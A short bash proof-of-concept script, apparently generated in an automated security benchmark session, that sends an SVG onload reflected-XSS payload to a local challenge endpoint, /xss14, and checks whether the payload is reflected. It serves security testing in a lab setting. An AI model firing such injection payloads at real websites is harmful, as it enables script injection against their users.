#!/bin/bash
# POC: Demonstrates reflected XSS in /xss14 endpoint using SVG onload payload that executes alert("XSS")
# Target: ./repo
# Created: 2025-10-31T16:52:56.621Z
# Session: benchmark-XBEN-046-24-mhf2uq0z

# POC for Reflected XSS in /xss14 Challenge via name Parameter
# Demonstrates SVG-based XSS payload execution

TARGET_URL="http://localhost:5001/xss14"
PAYLOAD='<svg onload=alert("XSS")>'

echo "==================================="
echo "XSS14 Reflected XSS POC"
echo "==================================="
echo ""
echo "[*] Target: $TARGET_URL"
echo "[*] Parameter: name"
echo "[*] Payload: $PAYLOAD"
echo ""
echo "[*] Sending malicious request..."
echo ""

# URL encode the payload and send the request
RESPONSE=$(curl -s -w "\n\nHTTP_STATUS:%{http_code}" "${TARGET_URL}?name=$(echo -n "$PAYLOAD" | jq -sRr @uri)")

# Extract HTTP status code
HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_STATUS/d')

echo "==================================="
echo "RESPONSE (HTTP $HTTP_STATUS):"
echo "==================================="
echo "$BODY"
echo ""

# Check for success indicators
if echo "$BODY" | grep -q "Congratulations"; then
    echo "[+] SUCCESS: XSS payload accepted!"
    echo "[+] Application returned success message"
    echo ""
elif echo "$BODY" | grep -q "$PAYLOAD"; then
    echo "[+] VULNERABLE: Payload reflected in response"
    echo "[+] The SVG tag with onload event handler is present in HTML"
    echo ""
else
    echo "[-] Unexpected response"
    echo ""
fi

# Check if the payload is reflected
if echo "$BODY" | grep -q "svg"; then
    echo "[+] CONFIRMED: SVG tag found in response"
    echo "[+] JavaScript will execute when page is loaded in browser"
    exit 0
else
    echo "[-] Payload not reflected as expected"
    exit 1
fi